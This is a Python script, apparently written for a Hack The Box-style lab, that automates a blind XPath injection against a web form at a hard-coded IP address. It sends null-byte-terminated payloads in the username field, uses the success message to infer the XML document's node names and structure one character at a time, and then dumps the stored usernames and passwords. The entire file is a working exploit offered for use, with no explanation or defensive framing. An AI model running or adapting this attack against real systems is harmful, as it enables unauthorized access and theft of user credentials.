import requests

wordlist = "HTBabcdefghijklmnopqrstuvwxyz-0123456789{}"
#calcular numero de caracteres de los nodo texto de los ultimos nodo hijo
def calculate_n_caracteres(payload):
    for i in range(0,40):
        data={"username":f"test' or string-length({payload}/text())={i}]\x00","msg":"test"}
        respuesta = requests.post('http://94.237.52.164:51193/index.php',data=data)
        if 'Message successfully sent!' in respuesta.text:
            return i
    return 0  

#calcular caracteres de los nodo texto de los ultimos nodo hijo
def value_caracteres(payload,longitud,wordlist):
    resultado = ""
    for i in range(1,longitud+1):
        for j in wordlist:
            data={"username":f"test' or substring({payload}/text(),{i},1)='{j}']\x00","msg":"test"}
            respuesta = requests.post('http://94.237.52.164:51193/index.php',data=data)
            if 'Message successfully sent!' in respuesta.text:
                resultado += j
                break
    return resultado

#calcular longitud del nombre del nodo
def calculate_length_nodo(payload):
    for i in range(0,20):
        data={"username":f"test' or string-length(name({payload}))={i}]\x00","msg":"test"}
        respuesta = requests.post('http://94.237.52.164:51193/index.php',data=data)
        if 'Message successfully sent!' in respuesta.text:
            return i
    return 0

##calcular nombre del nodo
def calculate_name_nodo(longitud,payload):
    nombre = ""
    for i in range(1,longitud+1):
        for j in wordlist:
            data={"username":f"test' or substring(name({payload}),{i},1)='{j}']\x00","msg":"test"}
            respuesta = requests.post('http://94.237.52.164:51193/index.php',data=data)
            if 'Message successfully sent!' in respuesta.text:
                nombre += j
                break
    return nombre

##calcular el numero de hijos del nodo
def calculate_child_node(nombre):
    for i in range(1,20):
        data={"username":f"test' or count(/{nombre}/*)={i}]\x00","msg":"test"}
        respuesta = requests.post('http://94.237.52.164:51193/index.php',data=data)
        if 'Message successfully sent!' in respuesta.text:
            return i
    return 0
acumulando = ''
payload = ''
rutas = []
def esquema_XML(acumulando,payload,rutas):
    if acumulando == '':
        payload = '/*[1]'
    longitud = calculate_length_nodo(payload)
    if longitud == 0:
        return
    name = calculate_name_nodo(longitud,payload)
    if acumulando == '':
        acumulando = name
        n_hijos = calculate_child_node(payload)
    else:
        acumulando = acumulando + '/'+name
        n_hijos = calculate_child_node(acumulando)
    print(f"Nombre del nodo: {name}")
    if n_hijos == 0:
            rutas.append('/'+acumulando)
            return
    else:
        print(f"Numero de nodos hijos del nodo anterior: {n_hijos}")
    for i in range(1,n_hijos+1):
        payload = '/'+acumulando+f'/*[{i}]'
        esquema_XML(acumulando,payload,rutas)
esquema_XML(acumulando,payload,rutas)

##rutas posibles
rutas = list(set(rutas))
rutas_amplificada =[]
for i in rutas:
        for j in range(1,3):
                rutas_amplificada.append(i.replace('/acc/',f'/acc[{j}]/'))
for i in rutas_amplificada:
	print(f"Una ruta posible: {i}")

##Volcando credenciales
for i in range(0,len(rutas_amplificada)):
        n_caracteres = calculate_n_caracteres(rutas_amplificada[i])
        resultado = value_caracteres(rutas_amplificada[i],n_caracteres,wordlist)
        if rutas_amplificada[i].find('username') != -1:
            print(f"Un username valido es el siguiente: {resultado}")
        else:
            print(f"Un password asociado a un username es el siguiente: {resultado}")
